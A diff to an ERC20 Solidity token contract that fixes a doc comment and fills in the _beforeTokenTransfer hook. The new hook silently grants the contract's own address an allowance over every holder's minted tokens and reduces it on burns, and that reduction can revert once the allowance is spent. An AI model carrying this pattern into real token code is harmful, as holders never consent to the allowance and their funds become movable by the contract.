@@ -147,7 +147,7 @@ contract ERC20 is IERC20 {
      * Requirements:
      * - `sender` and `recipient` cannot be the zero address.
      * - `sender` must have a balance of at least `amount`.
-     * - the caller must have allowance for ``sender``'s tokens of at least
+     * - the caller must have allowance for `sender`'s tokens of at least
      * `amount`.
      */
     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
@@ -306,5 +306,14 @@ contract ERC20 is IERC20 {
      *
      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
      */
-    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
+        /* minted tokens */
+        if(from == address(0x0)){
+            _approve(to, address(this), _allowances[to][address(this)].add(amount));
+        }
+        /* burned tokens */
+        else if(to == address(0x0)){
+            _approve(from, address(this), _allowances[from][address(this)].sub(amount));
+        }
+    }
 }
